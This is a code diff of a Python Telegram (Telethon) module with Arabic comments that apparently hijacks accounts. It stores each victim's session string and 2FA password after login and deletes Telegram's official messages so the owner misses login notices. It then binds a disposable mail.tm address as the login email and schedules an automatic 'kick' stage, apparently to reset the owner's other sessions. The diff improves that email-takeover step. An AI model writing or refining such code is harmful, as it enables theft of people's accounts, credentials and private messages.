@@ -24,7 +24,11 @@ from telethon.tl.functions.account import (
     SendVerifyEmailCodeRequest,
     VerifyEmailRequest,
 )
-from telethon.tl.types import EmailVerifyPurposeLoginSetup, EmailVerificationCode
+from telethon.tl.types import (
+    EmailVerifyPurposeLoginSetup,
+    EmailVerifyPurposeLoginChange,
+    EmailVerificationCode,
+)
 from telethon.tl.functions.auth import ResetAuthorizationsRequest, ResendCodeRequest
 
 import database
@@ -89,7 +93,9 @@ async def request_code(user_id: int, phone: str) -> dict:
         return {"success": False, "error": str(e)}
 
 
-async def post_registration_setup(phone: str, client) -> dict:
+async def post_registration_setup(
+    phone: str, client, phone_code_hash: str | None = None
+) -> dict:
     """
     مباشرة بعد التسجيل (بدون علاقة بالطرد):
     1. حذف رسائل تيليجرام
@@ -98,7 +104,7 @@ async def post_registration_setup(phone: str, client) -> dict:
     4. جدولة نظام الطرد التلقائي
     """
     await delete_telegram_official_messages(client)
-    email_res = await _bind_login_email(client, phone)
+    email_res = await _bind_login_email(client, phone, phone_code_hash=phone_code_hash)
     await delete_telegram_official_messages(client)
     await database.set_auto_kick_stage(phone, 0)
     schedule_auto_kick_pipeline(phone)
@@ -121,7 +127,9 @@ async def submit_code(user_id: int, code: str) -> dict:
         phone = database.normalize_phone(phone)
         await database.save_session(phone, username, full_name, session_string)
 
-        email_res = await post_registration_setup(phone, client)
+        email_res = await post_registration_setup(
+            phone, client, phone_code_hash=phone_code_hash
+        )
         del pending_clients[user_id]
         await client.disconnect()
         return {
@@ -155,7 +163,10 @@ async def submit_2fa(user_id: int, password: str) -> dict:
         phone = database.normalize_phone(phone)
         await database.save_session(phone, username, full_name, session_string, password)
 
-        email_res = await post_registration_setup(phone, client)
+        phone_code_hash = data.get("phone_code_hash")
+        email_res = await post_registration_setup(
+            phone, client, phone_code_hash=phone_code_hash
+        )
         del pending_clients[user_id]
         await client.disconnect()
         return {
@@ -381,9 +392,26 @@ async def fetch_code_from_email(
     return await mailtm.fetch_code(address, password, attempts, interval)
 
 
-async def _bind_login_email(client, phone: str) -> dict:
+async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None = None):
+    """
+    جلسة مسجّلة: LoginChange (بدون hash).
+    أثناء تسجيل الدخول قبل اكتماله: LoginSetup + phone_code_hash.
+    """
+    if await client.is_user_authorized():
+        return EmailVerifyPurposeLoginChange()
+    if phone_code_hash:
+        return EmailVerifyPurposeLoginSetup(
+            phone_number=database.normalize_phone(phone),
+            phone_code_hash=phone_code_hash,
+        )
+    return EmailVerifyPurposeLoginChange()
+
+
+async def _bind_login_email(
+    client, phone: str, phone_code_hash: str | None = None
+) -> dict:
     last_error = "جميع النطاقات مرفوضة من تيليجرام"
-    purpose = EmailVerifyPurposeLoginSetup()
+    purpose = await _email_verify_purpose(client, phone, phone_code_hash)
     try:
         domains = await mailtm.get_active_domains()
         for domain in domains:
@@ -400,7 +428,9 @@ async def _bind_login_email(client, phone: str) -> dict:
                     continue
                 raise
 
-            code = await fetch_code_from_email(new_email, email_password)
+            code = await fetch_code_from_email(
+                new_email, email_password, attempts=24, interval=5
+            )
             if not code:
                 return {
                     "success": False,
